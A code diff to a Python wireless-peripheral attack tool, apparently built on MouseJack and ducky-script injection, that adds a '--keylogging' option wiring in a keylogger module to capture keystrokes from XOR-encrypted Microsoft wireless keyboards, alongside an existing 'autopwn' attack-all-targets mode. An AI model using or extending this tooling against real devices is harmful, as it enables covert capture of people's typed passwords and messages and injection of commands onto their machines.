@@ -11,6 +11,7 @@ import click
 import tabulate
 import duckyparser
 import mousejack
+import keylogger
 
 
 __version__ = 1.00
@@ -125,7 +126,8 @@ def confirm_root():
 @click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
 @click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
 @click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
-def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn):
+@click.option('--keylogging', is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
+def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, keylogging):
 
     banner()
     confirm_root()
@@ -149,8 +151,9 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
             targeted = True
 
     if script == "":
-        _print_err("You must supply a ducky script using --script <filename>")
-        _print_err("Attacks are disabled.")
+        if not keylogging:
+            _print_err("You must supply a ducky script using --script <filename>")
+            _print_err("Attacks are disabled.")
         attack = ""
     else:
         f = open(script, 'r')
@@ -172,6 +175,11 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
             exit(-1)
         else:
             raise e
+
+    if keylogging:
+        k = keylogger.KeyLogger(jack, layout)
+        k.scan()
+        exit(-1)
 
     try:
         if autopwn:
@@ -230,7 +238,7 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
 
     except KeyboardInterrupt:
         print('\n ' + R + '(^C)' + O + ' interrupted\n')
-        print("[-] Quitting")
+        print('[-] Quitting' + W)
 
 
 if __name__ == '__main__':
